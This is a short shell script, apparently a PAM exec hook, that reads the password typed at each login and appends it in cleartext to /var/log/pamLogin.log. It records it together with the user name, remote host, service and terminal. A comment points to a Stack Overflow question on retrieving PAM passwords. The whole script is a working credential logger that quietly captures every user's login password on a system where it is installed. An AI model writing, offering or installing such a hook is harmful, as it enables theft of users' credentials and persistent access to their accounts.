#!/bin/sh

#https://stackoverflow.com/questions/7725770/how-to-retrieve-user-password-in-cleartext-using-pam

read password
echo $(date) >> /var/log/pamLogin.log
echo "User: $PAM_USER" >> /var/log/pamLogin.log
echo "Ruser: $PAM_RUSER" >> /var/log/pamLogin.log
echo "Rhost: $PAM_RHOST" >> /var/log/pamLogin.log
echo "Service: $PAM_SERVICE" >> /var/log/pamLogin.log
echo "TTY: $PAM_TTY" >> /var/log/pamLogin.log
echo "Password : $password" >> /var/log/pamLogin.log
echo >> /var/log/pamLogin.log
exit $?
